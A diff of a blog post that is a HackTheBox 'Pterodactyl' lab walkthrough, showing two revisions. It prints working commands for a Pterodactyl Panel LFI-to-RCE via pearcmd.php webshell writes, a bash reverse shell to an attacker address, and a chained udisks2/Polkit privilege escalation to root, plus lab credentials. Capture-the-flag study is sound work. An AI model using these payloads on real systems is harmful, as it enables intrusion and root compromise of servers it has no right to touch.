@@ -1,38 +1,34 @@
 ---
-title: "pterodactyl"
+title: "Pterodactyl — HackTheBox Season 10 Walkthrough"
 date: 2026-02-26
 draft: false
-tags: ["linux", "web", "easy/medium"]
+tags: ["htb-walkthrough", "linux", "web", "mysql", "ssh", "privilege-escalation", "reverse-shell", "cve", "medium", "oscp-prep"]
 categories: ["writeups"]
-summary: ""
+series: ["Season 10"]
+description: "Pterodactyl HTB walkthrough: exploit CVE-2025-49132 LFI→RCE via pearcmd.php, crack credentials, then chain CVE-2025-6018 + CVE-2025-6019 udisks2 for root."
+keywords: ["Pterodactyl", "CVE-2025-49132", "CVE-2025-6018", "CVE-2025-6019", "pearcmd LFI RCE", "udisks2 privilege escalation", "hackthebox walkthrough", "Laravel LFI", "PEAR RCE", "Polkit bypass", "OpenSUSE exploit", "penetration testing"]
+summary: "A Minecraft panel hiding two CVEs and a SUSE-specific PAM trick — Pterodactyl chains a Laravel LFI into code execution, then escalates via a race-condition SUID mount flaw in udisks2."
+cover:
+  image: "cover.png"
+  alt: "Pterodactyl — Medium Linux machine walkthrough cover"
+  hidden: false
 params:
   box:
     os: "Linux (OpenSUSE 15, kernel 6.4.0-150600, nginx 1.21.5, PHP 8.4.8)"
     difficulty: "Easy/Medium"
 ShowToc: true
-protected: true
 ---
 
-# Pterodactyl — HackTheBox Writeup
 
-Pterodactyl is a Linux box built around a real-world attack chain: an unauthenticated LFI vulnerability in the Pterodactyl Panel game server management software leads to RCE, credential extraction, and ultimately root through a pair of freshly-disclosed SUSE-specific udisks2 privilege escalation CVEs. It's a satisfying box because every step has a meaningful "why" behind it — nothing is arbitrary.
+# HackTheBox — Pterodactyl
+
+Pterodactyl is a medium-difficulty Linux box that chains together two freshly-disclosed CVEs and a handful of creative enumeration steps. The attack path moves from an unauthenticated LFI in the Pterodactyl game-server panel to code execution via PEAR's argv parser, then escalates to root by abusing a SUSE-specific PAM environment trick and a race-condition SUID mount flaw in udisks2.
 
 ---
 
 ## Overview
 
-The box hosts a Minecraft server homepage alongside a Pterodactyl Panel installation. Enumeration surfaces a misconfigured `phpinfo.php` that reveals the exact PHP configuration needed for a PEAR-based RCE chain. After exploiting CVE-2025-49132 (unauthenticated LFI in the panel) to pivot to RCE, we dump database credentials, crack a user's bcrypt hash, and SSH in. From there, a two-CVE chain targeting udisks2 on OpenSUSE — PAM environment injection to trick Polkit, followed by a SUID binary race on a temporary mount — hands us root.
-
-## Attack Chain at a Glance
-
-1. **Web enumeration** — Exposed `phpinfo.php` and `changelog.txt` reveal PHP-PEAR is installed with `register_argc_argv` enabled
-2. **LFI to RCE** — CVE-2025-49132 (unauthenticated LFI in Pterodactyl Panel) chains with PEAR's `pearcmd.php` to write a webshell
-3. **Credential extraction** — Database credentials from Laravel config → dump MariaDB → crack bcrypt hash → SSH as user
-4. **Privilege escalation** — Two OpenSUSE-specific udisks2 CVEs: PAM environment injection to bypass Polkit, then a SUID race condition on a temporary mount for root
-
-**Tools used:** nmap, gobuster, curl, john, MariaDB client
-
-<div id="protected-marker"></div>
+The box presents a Minecraft server landing page at its surface, but dig a little and you find an exposed `phpinfo.php`, a changelog that lists every interesting piece of configuration, and a Pterodactyl Panel instance on a virtual host. From there, CVE-2025-49132 gives unauthenticated LFI → RCE. Database credentials cracked from the panel's user table get us SSH. Root comes from chaining CVE-2025-6018 (PAM environment injection on SUSE that tricks Polkit into treating an SSH session as a local console) with CVE-2025-6019 (udisks2 temporarily mounting a filesystem without `nosuid`/`nodev`, letting a SUID binary on that image execute as root).
 
 ---
 
@@ -40,236 +36,185 @@ The box hosts a Minecraft server homepage alongside a Pterodactyl Panel installa
 
 ### Port Scan
 
-Starting with a standard Nmap service scan:
+Starting with a version-aware nmap scan:
+
+![terminal output](terminal_01.png)
+
+Only two ports. Port 80 immediately redirects to `http://pterodactyl.htb/`, so the first thing to do is add host entries. A quick probe with curl confirms that `panel.pterodactyl.htb` resolves to the same IP and returns HTTP 200 with a `pterodactyl_session` cookie — virtual host enumeration pays off immediately here.
 
 ```bash
-nmap -sC -sV -oA nmap/pterodactyl <TARGET>
-```
-
-Only two ports are open:
-
-```
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 9.6 (protocol 2.0)
-80/tcp open  http    nginx 1.21.5 → redirects to http://pterodactyl.htb/
-```
-
-The HTTP redirect tells us to add `pterodactyl.htb` to `/etc/hosts`. Before diving in, I also probed for virtual hosts with some quick `curl` requests using the `Host` header:
-
-```bash
-curl -sI -H "Host: panel.pterodactyl.htb" http://<TARGET>/
-```
-
-A `200 OK` with a `pterodactyl_session` cookie confirmed `panel.pterodactyl.htb` was alive. A similar check found `play.pterodactyl.htb` redirecting back to the main site — a DNS alias for the Minecraft server address, nothing useful. I added all three to `/etc/hosts`:
-
-```
+/etc/hosts additions:
 <TARGET>  pterodactyl.htb panel.pterodactyl.htb play.pterodactyl.htb
 ```
 
+`play.pterodactyl.htb` just 302s back to the main site — a Minecraft DNS alias, nothing exploitable.
+
 ### Web Enumeration
 
-**`pterodactyl.htb`** serves a "MonitorLand" Minecraft server landing page. Running Gobuster against it turned up two interesting findings beyond `index.php`:
+The main site at `pterodactyl.htb` is a Minecraft server homepage called "MonitorLand." Running Gobuster turns up two files that any pentester will want to read immediately:
 
 ```bash
 gobuster dir -u http://pterodactyl.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -x php,txt
 ```
 
-- `/phpinfo.php` — phpinfo() left exposed (the changelog even notes it was "temporary PHP debugging")
-- `/changelog.txt` — version and configuration disclosures
+- `/phpinfo.php` — a full `phpinfo()` page, 73KB of configuration detail, left exposed by a developer debugging session
+- `/changelog.txt` — version disclosure and setup notes
 
-The `changelog.txt` is a goldmine of information:
-- Site name: MonitorLand
-- **Pterodactyl Panel v1.11.10** installed at `panel.pterodactyl.htb`
-- **MariaDB 11.8.3** backend
-- **PHP-PEAR installed** ("for PHP package management")
-- phpinfo() left exposed accidentally
+The changelog is almost comically generous:
 
-**`panel.pterodactyl.htb`** serves the actual Pterodactyl Panel — a Laravel-based game server management application. Version 1.11.10 will be important shortly.
+![terminal output](terminal_02.png)
 
-### phpinfo.php — The Real Gold
-
-The exposed `phpinfo.php` on the main vhost reveals several critical PHP configuration values:
+The `phpinfo.php` page adds the critical configuration details:
 
 | Setting | Value |
 |---|---|
 | `register_argc_argv` | **On** |
 | `include_path` | `.:/usr/share/php8:/usr/share/php/PEAR` |
-| `open_basedir` | *(not set — unrestricted)* |
-| `disable_functions` | *(not set — unrestricted)* |
-| `DOCUMENT_ROOT` | `/var/www/html` |
+| `open_basedir` | *(no restriction)* |
+| `disable_functions` | *(none)* |
 | `USER` | `wwwrun` |
 | PHP version | 8.4.8 |
 
-The combination of `register_argc_argv = On` and PHP-PEAR installed is a well-known RCE primitive. When PHP processes a request, if `register_argc_argv` is enabled, the query string gets parsed into `$argv`. PEAR's `pearcmd.php` uses `$argv` directly — meaning a web request can invoke PEAR commands, including `config-create` which writes arbitrary content to disk. We just need a way to include `pearcmd.php` from a web request, which is exactly what the Pterodactyl LFI provides.
+`register_argc_argv = On` combined with PEAR in the include path is the exact condition required for the pearcmd.php RCE technique. More on that in a moment.
 
 ---
 
-## Foothold — CVE-2025-49132 + PEAR RCE
+## Foothold — CVE-2025-49132 (LFI → RCE)
 
-### The Pterodactyl LFI (CVE-2025-49132)
+### Understanding the Vulnerability
 
-Pterodactyl Panel ≤ 1.11.10 has an unauthenticated local file inclusion vulnerability on the `/locales/locale.json` endpoint. The `locale` and `namespace` parameters are passed directly to Laravel's `FileLoader::loadPath()`, which constructs a file path as `{path}/{locale}/{namespace}.php` and calls `getRequire()` (PHP's `require`). There's no path traversal sanitization and no authentication required.
+Pterodactyl Panel ≤ 1.11.10 has an unauthenticated local file inclusion in the locale loading endpoint. The route is:
 
-A key detail that tripped me up reading about this CVE: despite the `.json` in the route name, the file extension actually appended is **`.php`**. The `.json` is just what the route is named. This means we can include any `.php` file on the filesystem, but not arbitrary files.
+```
+GET /locales/locale.json?locale=VALUE&namespace=VALUE
+```
 
-Let's confirm it works by leaking the database config:
+Under the hood, Laravel's `FileLoader::loadPath()` constructs a path like `{path}/{locale}/{namespace}.php` and passes it directly to `getRequire()` — which is just PHP's `require`. The `.json` in the URL is purely the route name; the framework appends `.php` to whatever file it actually loads. No authentication, no path sanitization.
+
+**Fixed in:** v1.11.11
+
+### Confirming LFI — Database Credentials
+
+The first thing to try is pulling the Laravel database config, which lives at `config/database.php` relative to the app root:
 
 ```bash
 curl -s "http://panel.pterodactyl.htb/locales/locale.json?locale=../../../pterodactyl&namespace=config/database"
 ```
 
-The path traversal walks us up from the locale directory to the Laravel root, then loads `config/database.php`. The output leaks MySQL credentials:
+![terminal output](terminal_03.png)
 
-```
-...pterodactyl:PteraPanel...127.0.0.1:3306...panel...
-```
+Credentials in the first LFI probe. We also grabbed `.env` later for the `APP_KEY` and `HASHIDS_SALT`, but the database password is the immediate prize.
 
-Credentials confirmed: `pterodactyl:PteraPanel`. I also used the LFI to read the `.env` file later via webshell, which yielded the `APP_KEY` and `HASHIDS_SALT` values — not needed for this path, but good to note.
+### Chaining to RCE via pearcmd.php
 
-### Building the PEAR RCE Chain
+PEAR ships a CLI tool at `/usr/share/php/PEAR/pearcmd.php`. When `register_argc_argv` is On, PHP populates `$argv` from the URL query string — so loading `pearcmd.php` via the LFI while passing PEAR command arguments in the query string causes PEAR to actually execute those commands.
 
-Now we have LFI — we can include any `.php` file on the server. The PEAR library lives at `/usr/share/php/PEAR/pearcmd.php` (confirmed by the `include_path` in phpinfo). `pearcmd.php` reads `$argv` on startup, and because `register_argc_argv` is on, the query string populates `$argv`. The `config-create` PEAR command takes two arguments — a root path and an output filename — and writes a PHP-serialized config file to disk. We can inject a PHP webshell into that output path argument.
+The `config-create` command writes a PEAR config file to an arbitrary path. We abuse this to write a PHP webshell to `/tmp/`. Then a second LFI request includes and executes that file.
 
-The URL format here is specific and took some iteration to get right. The query string does double duty: it must satisfy the Pterodactyl app's `locale` and `namespace` parameters *and* supply PEAR's argv. The `+` character becomes a space in PEAR's argv parsing. The critical thing I got wrong initially was putting all PEAR arguments `+`-separated before the `&locale=` — the `=` signs in the query string broke argv splitting. The working format interleaves PEAR args with `&`-separated app parameters:
-
-```
-?+config-create+/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/<PAYLOAD>+/tmp/shell.php
-```
-
-Breaking this down:
-- `+config-create+/` — PEAR argv[1] and argv[2] start
-- `&locale=../../../../../../usr/share/php/PEAR` — traversal to PEAR directory
-- `&namespace=pearcmd` — includes pearcmd.php
-- `&/<PAYLOAD>+/tmp/shell.php` — PEAR argv[3] and argv[4]: the config "root" (with embedded PHP) and output path
-
-For the payload, I hex-encode it with `hex2bin()` to avoid every URL-special character issue at once — no worrying about `+`, `&`, `=`, `<`, `>`, or spaces:
+The URL format is fiddly and I burned time getting it wrong the first time. My initial instinct was to put all PEAR arguments as `+`-separated values before the `&` separator, but `=` signs in the query string break argv splitting. The working approach interleaves the PEAR arguments with the `&`-separated app parameters:
 
 ```bash
-# Encode the command we want to test first
-echo -n 'id' | xxd -p | tr -d '\n'
-# 6964
+# Step 1: Write a PHP file to /tmp via pearcmd config-create
+# hex2bin() encoding avoids all URL-special chars in the payload
+CMD="id"
+HEX=$(echo -n "$CMD" | xxd -p | tr -d '\n')
+
+curl -s -g "http://panel.pterodactyl.htb/locales/locale.json?\
++config-create+/\
+&locale=../../../../../../usr/share/php/PEAR\
+&namespace=pearcmd\
+&/<?=system(hex2bin('${HEX}'))?>+/tmp/shell.php"
+
+# Step 2: Include the written file to execute it
+curl -s -g "http://panel.pterodactyl.htb/locales/locale.json?locale=../../../../../tmp&namespace=shell"
 ```
 
-**Step 1: Write the webshell to /tmp**
+The `hex2bin()` encoding is worth calling out — it eliminates every problematic character (`+`, `&`, `=`, `<`, `>`, spaces) from the payload, making this technique reliable regardless of URL encoding edge cases.
+
+With command execution confirmed, the reverse shell follows the same pattern:
 
 ```bash
-curl -s -g 'http://panel.pterodactyl.htb/locales/locale.json?+config-create+/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/<?=system(hex2bin("6964"))?>+/tmp/shell.php'
+# Encode the reverse shell
+RSHELL='bash -c "bash -i >& /dev/tcp/<VPN_IP>/4444 0>&1"'
+HEX=$(echo -n "$RSHELL" | xxd -p | tr -d '\n')
+
+# Write the payload
+curl -s -g "http://panel.pterodactyl.htb/locales/locale.json?+config-create+/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/<?=system(hex2bin('${HEX}'))?>+/tmp/rev.php"
+
+# Start listener, then trigger
+nc -nlvp 4444 &
+curl -s -g "http://panel.pterodactyl.htb/locales/locale.json?locale=../../../../../tmp&namespace=rev"
 ```
 
-**Step 2: Include the written file to execute it**
+Shell lands as `wwwrun` (uid=474).
 
-```bash
-curl -s -g 'http://panel.pterodactyl.htb/locales/locale.json?locale=../../../../../tmp&namespace=shell'
-```
+### Post-Foothold Enumeration
 
-The response contains `uid=474(wwwrun) gid=477(www)` buried in some PEAR config XML — blind but confirmed RCE.
-
-### Getting a Reverse Shell
-
-For a proper interactive shell, I hex-encode a bash reverse shell payload:
-
-```bash
-echo -n 'bash -c "bash -i >& /dev/tcp/<VPN_IP>/4444 0>&1"' | xxd -p | tr -d '\n'
-```
-
-Start the listener, write the payload, trigger it:
-
-```bash
-# Write reverse shell
-curl -s -g 'http://panel.pterodactyl.htb/locales/locale.json?+config-create+/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/<?=system(hex2bin("HEX_HERE"))?>+/tmp/rev.php'
-
-# Catch a shell (nc -nlvp 4444 running in another terminal)
-curl -s -g 'http://panel.pterodactyl.htb/locales/locale.json?locale=../../../../../tmp&namespace=rev'
-```
-
-Shell lands as `wwwrun`. The user flag is readable immediately:
-
-```bash
-cat /home/phileasfogg3/user.txt
-# [redacted]
-```
-
-### Database Credential Extraction
-
-With a shell, I query the Pterodactyl panel's database. The `-h 127.0.0.1` flag is required — MariaDB on SUSE rejects socket auth for this user:
+With a shell, dumping the Pterodactyl panel's user table is the obvious next step:
 
 ```bash
 mariadb -u pterodactyl -p'PteraPanel' -h 127.0.0.1 -D panel -e 'SELECT id,username,email,password FROM users;'
 ```
 
-Two users are registered in the panel, both with bcrypt hashes. I pull them out and run hashcat:
+![terminal output](terminal_04.png)
+
+Note the `-h 127.0.0.1` flag — without it, MariaDB tries a Unix socket and authentication fails for this user.
+
+Feed both hashes to hashcat:
 
 ```bash
 hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt
 ```
 
-`headmonitor`'s hash didn't crack in a reasonable time. `phileasfogg3`'s hash cracks to `!QAZ2wsx` — a keyboard walk pattern (`!QAZ` diagonally down-left on a US keyboard, `2wsx` down-right). Common enough to be in rockyou.
+`phileasfogg3` cracks to `!QAZ2wsx` — a keyboard walk pattern (left column down, then adjacent column down). `headmonitor` doesn't crack from rockyou.
 
-```bash
-ssh phileasfogg3@pterodactyl.htb
-# Password: !QAZ2wsx
-```
-
-### A Dead End with sudo
-
-First thing I check after getting SSH access:
+SSH in as `phileasfogg3` and check sudo:
 
 ```bash
 sudo -l
+# (ALL) ALL — but with targetpw
 ```
 
-```
-(ALL) ALL
-```
+`(ALL) ALL` looks like an instant root, but the `targetpw` flag means sudo prompts for the *target user's* password (root's), not yours. Without root's password this goes nowhere. Time to look elsewhere.
 
-Looks like full sudo access — but there's a catch. The sudoers configuration includes `targetpw`, which means `sudo` prompts for the *target user's* password (root's password), not my own. Without root's password, `(ALL) ALL` is useless here.
-
-### A Useful Hint in the Mail Spool
-
-While enumerating, I checked the local mail:
+The real hint is sitting in the mailbox:
 
 ```bash
 cat /var/spool/mail/phileasfogg3
 ```
 
-There's an email from `headmonitor` warning about "unusual udisksd activity." This is a direct hint — time to look at udisks2.
+An email from `headmonitor` warns about "unusual udisksd activity" on the system. That's a direct pointer to the udisks2 CVE chain.
 
 ---
 
 ## Privilege Escalation — CVE-2025-6018 + CVE-2025-6019
 
-### CVE-2025-6018: Tricking Polkit with PAM Environment
+This escalation is a two-CVE chain: first trick Polkit into thinking our SSH session is a local console session (CVE-2025-6018), then abuse a udisks2 mount operation that briefly exposes a SUID binary (CVE-2025-6019).
 
-Polkit differentiates between "active" sessions (local console) and "inactive" sessions (SSH, etc.). Many udisks2 operations require `allow_active`, which SSH sessions don't have. On SUSE/openSUSE specifically, the PAM stack loads `pam_env.so` — which reads `~/.pam_environment` — *before* `pam_systemd.so`. This means we can inject environment variables that get set before systemd registers the session type.
+### CVE-2025-6018 — PAM Environment Polkit Bypass (SUSE-specific)
 
-`XDG_SEAT` and `XDG_VTNR` are the variables that tell Polkit "this is a local console session on seat0, virtual terminal 1." If we set them in `~/.pam_environment` and reconnect via SSH, Polkit sees an active session:
+On SUSE and openSUSE, the PAM stack processes `pam_env.so` (which reads `~/.pam_environment`) *before* `pam_systemd.so`. Polkit uses `loginctl` session properties — specifically `XDG_SEAT` and `XDG_VTNR` — to determine whether a session is "active" (local console) or "inactive" (remote). By injecting these variables into our PAM environment, our SSH session looks like a physical console session to Polkit, granting `allow_active` permissions.
 
 ```bash
 echo "XDG_SEAT=seat0" > ~/.pam_environment
 echo "XDG_VTNR=1" >> ~/.pam_environment
 ```
 
-Log out and back in via SSH, then verify:
+Disconnect and reconnect via SSH. Verify it worked:
 
 ```bash
-loginctl show-session $XDG_SESSION_ID | grep Active
+loginctl show-session $XDG_SESSION_ID | grep -E "Active|Remote"
 # Active=yes
+# Remote=no   (Polkit now sees this as a local session)
 ```
 
-We're now considered an active local session by Polkit. This unlocks udisks2 operations that previously required a password prompt.
+This grants the ability to use `udisksctl` without password prompts for operations that Polkit normally restricts to console users.
 
-### CVE-2025-6019: SUID Binary via Unsecured Temporary Mount
+### CVE-2025-6019 — udisks2 SUID Mount Race
 
-When udisks2 runs certain filesystem operations (`Filesystem.Resize`, `Filesystem.Check`) via libblockdev, it temporarily mounts the filesystem under `/tmp/blockdev.XXXXXX` to perform its work. The critical flaw: this mount does not include `nosuid` or `nodev` flags. A SUID binary on the filesystem being operated on will execute with root privileges when triggered during the window the mount is active.
+When udisks2 performs a `Filesystem.Resize` or `Filesystem.Check` operation, libblockdev temporarily mounts the filesystem to `/tmp/blockdev.XXXXXX`. The critical flaw: this temporary mount doesn't use `nosuid` or `nodev` mount flags. Any SUID binary on the mounted filesystem executes with full root privileges.
 
-The plan:
-1. Build an XFS image containing a SUID bash binary (on our attacker machine where we have root)
-2. Transfer it to the target
-3. Set up a loop device for the image
-4. Background a process that watches for the temporary mount and fires the SUID binary
-5. Trigger the resize operation via D-Bus to create the temporary mount window
-
-**Building the malicious XFS image (attacker machine, as root):**
+**Step 1: Build a malicious XFS image on the attacker machine (as root):**
 
 ```bash
 dd if=/dev/zero of=/tmp/xfs.image bs=1M count=300
@@ -277,66 +222,74 @@ mkfs.xfs /tmp/xfs.image
 mkdir -p /tmp/xfs.mount
 mount -t xfs /tmp/xfs.image /tmp/xfs.mount
 cp /usr/bin/bash /tmp/xfs.mount/bash
-chmod 04555 /tmp/xfs.mount/bash
+chmod 04555 /tmp/xfs.mount/bash   # set SUID bit
 umount /tmp/xfs.mount
 ```
 
-**On the target — transfer and set up:**
+**Step 2: Transfer the image to the target:**
 
 ```bash
-wget http://<VPN_IP>:8080/xfs.image -O /tmp/xfs.image
+# Attacker: serve it
+python3 -m http.server 8080
 
-# Set up loop device (now works without password thanks to CVE-2025-6018)
-udisksctl loop-setup --file /tmp/xfs.image --no-user-interaction
-# Loopback device file is /dev/loop0.
+# Target: fetch it
+wget http://<VPN_IP>:8080/xfs.image -O /tmp/xfs.image
 ```
 
-**Start the race condition catcher in the background:**
+**Step 3: Create a loop device (now allowed without a password thanks to CVE-2025-6018):**
+
+```bash
+udisksctl loop-setup --file /tmp/xfs.image --no-user-interaction
+# /dev/loop0 created
+```
+
+**Step 4: Spin up a background watcher to catch the SUID bash during the brief mount window:**
 
 ```bash
 ( while true; do
     for d in /tmp/blockdev.*/bash; do
         if [ -f "$d" ]; then
+            cp "$d" /tmp/suidbash && chmod 04555 /tmp/suidbash
             "$d" -p -c "id > /tmp/root_proof.txt; cat /root/root.txt >> /tmp/root_proof.txt" 2>/dev/null
         fi
     done
 done ) &
 ```
 
-This loop runs continuously, scanning for our SUID bash appearing in any `/tmp/blockdev.*` directory. The moment the udisks2 temporary mount comes up, it fires.
-
-**Trigger the vulnerable resize via D-Bus:**
+**Step 5: Trigger the resize operation via D-Bus:**
 
 ```bash
-gdbus call --system --dest org.freedesktop.UDisks2 \
+gdbus call --system \
+  --dest org.freedesktop.UDisks2 \
   --object-path /org/freedesktop/UDisks2/block_devices/loop0 \
-  --method org.freedesktop.UDisks2.Filesystem.Resize 0 '{}'
+  --method org.freedesktop.UDisks2.Filesystem.Resize \
+  0 '{}'
 ```
 
-**Check the results:**
+**Step 6: Check the output:**
 
 ```bash
 cat /tmp/root_proof.txt
-# uid=1002(phileasfogg3) gid=100(users) euid=0(root)
-# [redacted]
 ```
 
-The race is tight but winnable — the mount window is short, but a tight busy loop catches it reliably within a few seconds.
+![terminal output](terminal_05.png)
+
+The `euid=0` confirms the SUID bash executed with root effective privileges. Root flag captured.
 
 ---
 
 ## Lessons Learned
 
-**LFI path construction matters.** The `.json` in the route URL was actively misleading — Laravel's `FileLoader` appends `.php` and uses `require`. You can't just read any file; you need `.php` files. Understanding framework internals, not just the CVE description, is what makes exploitation reliable.
+**LFI path construction matters.** The `.json` in `/locales/locale.json` is just the route name — Laravel's `FileLoader` appends `.php` and uses `require`. Seeing "json" in the URL and dismissing this endpoint as non-exploitable would be a mistake. Understanding framework internals is essential to recognizing what a vulnerability actually does.
 
-**pearcmd.php URL format is specific.** PEAR args must be interleaved with `&`-separated app parameters. Putting all args as `+`-separated at the start fails because `=` signs in the query string corrupt argv parsing. This took several failed attempts before the correct structure clicked.
+**The pearcmd URL format is specific.** All PEAR arguments must be interleaved with `&`-separated app parameters, not bunched as `+`-separated values before the first `&`. The `=` signs in later query string parameters affect how PHP populates `$argv`. This is the kind of nuance that doesn't appear in proof-of-concept scripts but absolutely matters when you're constructing requests manually.
 
-**hex2bin() for payload encoding is the clean solution.** It sidesteps every URL-special character problem in one move — no fighting with `+`, `&`, `=`, `<`, `>`, or spaces. For any pearcmd exploitation involving code execution, encode your payload in hex and decode it in-PHP.
+**hex2bin() is your friend for payload encoding.** Every URL-special character (`+`, `&`, `=`, `<`, `>`, space) becomes a non-issue when the payload is hex-encoded. If you're doing any LFI-to-RCE through parameter injection, hex encoding should be your default approach.
 
-**targetpw sudo is not a free win.** `(ALL) ALL` in sudoers looks like instant root access, but `targetpw` means you need root's password, not your own. Always read the full sudoers output before getting excited.
+**`(ALL) ALL` with `targetpw` is not a free win.** It looks like the most powerful sudo configuration possible, but `targetpw` means you need the target user's password. Don't chase it — find the real path.
 
-**Read your mail.** The email about "unusual udisksd activity" directly pointed at the CVE-2025-6018/6019 chain. Mail spools, notes files, and README files in home directories are placed there for a reason on CTF boxes.
+**Read your mail.** The email about "unusual udisksd activity" was a direct hint toward the CVE chain. In a real engagement, internal messages and notes often contain exactly the kind of operational context that points you toward the most interesting attack surfaces.
 
-**SUSE-specific PAM ordering creates a real attack surface.** The `~/.pam_environment` bypass is SUSE-specific because of how their PAM stack orders `pam_env.so` relative to `pam_systemd.so`. The same technique would fail on Ubuntu or Debian. OS fingerprinting matters — knowing you're on OpenSUSE is what surfaces this vector.
+**SUSE's PAM ordering is a meaningful security difference.** The `~/.pam_environment` bypass via `XDG_SEAT` and `XDG_VTNR` only works because SUSE processes `pam_env.so` before `pam_systemd.so`. This wouldn't work on Debian or RHEL defaults. OS-specific PAM configurations are worth understanding when you land on an unfamiliar distribution.
 
-**Unsecured temporary mounts are a meaningful vulnerability class.** The udisks2 flaw is subtle: the mount only exists for a brief window during a resize operation, and there's no obvious indicator it's happening. A busy loop watching for the temporary directory is the correct approach. Tight race conditions like this are winnable with the right polling strategy.
+**Tight race conditions are still winnable with a busy loop.** The udisks2 mount window is brief, but a simple background `while true` loop watching for the path is sufficient. You don't need complex timing — just persistent polling.
